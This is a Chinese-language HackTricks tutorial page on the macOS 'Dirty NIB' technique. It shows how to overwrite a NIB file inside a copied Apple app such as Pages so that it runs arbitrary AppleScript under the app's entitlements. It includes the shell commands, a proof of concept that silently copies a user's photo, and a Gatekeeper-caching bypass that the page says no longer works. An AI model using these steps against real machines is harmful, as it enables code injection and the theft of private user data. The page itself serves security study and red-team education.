# macOS Dirty NIB

<details>

<summary><strong>零基础学习AWS黑客技术直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

**此技术摘自帖子** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## 基本信息

NIB文件在苹果的开发生态系统中用于**定义用户界面（UI）元素**及其在应用程序中的交互。这些文件是使用Interface Builder工具创建的，包含**序列化对象**，如窗口、按钮和文本字段，这些对象在运行时加载以展示设计的UI。尽管NIB文件仍在使用中，苹果已经开始推荐使用Storyboards来更直观地表示应用程序的UI流程。

{% hint style="danger" %}
此外，**NIB文件**也可以用来**运行任意命令**，如果应用中的NIB文件被修改，**Gatekeeper仍然允许执行该应用**，因此它们可以用来**在应用程序内运行任意命令**。
{% endhint %}

## Dirty NIB注入 <a href="#dirtynib" id="dirtynib"></a>

首先我们需要创建一个新的NIB文件，我们将使用XCode来完成大部分构建工作。我们开始通过向界面添加一个对象，并将类设置为NSAppleScript：

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

对于该对象，我们需要设置初始的`source`属性，我们可以使用用户定义的运行时属性来完成：

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

这样就建立了我们的代码执行小工具，它将在请求时**运行AppleScript**。为了实际触发AppleScript的执行，我们现在只添加一个按钮（当然，你可以在这方面发挥创意;)。按钮将绑定到我们刚刚创建的`Apple Script`对象，并将**调用`executeAndReturnError:`选择器**：

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

为了测试，我们将只使用Apple Script代码：
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
如果我们在XCode调试器中运行这个并点击按钮：

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

有了从NIB执行任意AppleScript代码的能力，我们接下来需要一个目标。让我们选择Pages作为我们的初始演示目标，这当然是一个苹果应用程序，理论上不应该被我们修改。

我们将首先将应用程序复制到`/tmp/`目录：
```bash
cp -a -X /Applications/Pages.app /tmp/
```
然后我们将启动应用程序以避免任何Gatekeeper问题，并允许内容被缓存：
```bash
open -W -g -j /Applications/Pages.app
```
在第一次启动（并终止）应用程序后，我们需要用我们的DirtyNIB文件覆盖一个现有的NIB文件。为了演示目的，我们将覆盖关于面板NIB，这样我们可以控制执行过程：
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
一旦我们覆盖了nib，我们可以通过选择`About`菜单项来触发执行：

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

如果我们更仔细地观察Pages，我们会发现它有一个私有权限，允许访问用户的Photos：

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

因此，我们可以通过**修改我们的AppleScript来窃取用户的照片**，而不提示用户，来测试我们的POC：

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**恶意 .xib 文件执行任意代码示例。**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## 创建你自己的 DirtyNIB



## 启动限制

它们基本上**阻止在预期位置之外执行应用程序**，所以如果你将受到启动限制保护的应用程序复制到 `/tmp`，你将无法执行它。\
[**在这篇文章中找到更多信息**](../macos-security-protections/#launch-constraints)**。**

然而，解析文件 **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** 时，你仍然可以找到**没有受到启动限制保护的应用程序**，因此你仍然可以**注入** **NIB** 文件到**那些**任意位置（查看前面的链接学习如何找到这些应用程序）。

## 额外保护

从 macOS Somona 开始，有一些保护措施**防止在应用程序内部写入**。然而，如果在运行你复制的二进制文件之前，你更改了 Contents 文件夹的名称，仍然可以绕过这个保护：

1. 将 `CarPlay Simulator.app` 的副本复制到 `/tmp/`
2. 重命名 `/tmp/Carplay Simulator.app/Contents` 为 `/tmp/CarPlay Simulator.app/NotCon`
3. 启动二进制文件 `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` 以在 Gatekeeper 中缓存
4. 用我们的 `Dirty.nib` 文件覆盖 `NotCon/Resources/Base.lproj/MainMenu.nib`
5. 重命名为 `/tmp/CarPlay Simulator.app/Contents`
6. 再次启动 `CarPlay Simulator.app`

{% hint style="success" %}
看起来这已经不再可能，因为 macOS **阻止修改** 应用程序包内的文件。\
所以，在执行应用程序以使用 Gatekeeper 缓存之后，你将无法修改包。\
如果你更改了 Contents 目录的名称为 **NotCon**（如在漏洞中所示），然后执行应用程序的主二进制文件以使用 Gatekeeper 缓存，它将**触发错误并不会执行**。
{% endhint %}

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。**

</details>
